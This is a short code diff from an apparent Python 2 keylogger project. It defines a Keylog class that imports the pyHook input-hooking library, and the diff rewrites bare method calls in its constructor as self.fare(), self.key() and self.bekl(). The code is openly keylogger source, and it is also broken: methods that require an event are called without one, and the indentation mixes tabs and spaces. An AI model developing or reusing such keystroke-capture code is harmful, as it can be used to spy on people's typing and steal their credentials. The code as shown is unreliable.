@@ -3,10 +3,11 @@ import pyHook
 
 
 class Keylog(object):
+
      def __init__(self):
-        fare()
-	key()
-	bekl()
+        self.fare()
+	self.key()
+	self.bekl()
 
      def fare(self, event):
     	print 'mesaj ismi:', self.event.MessageName
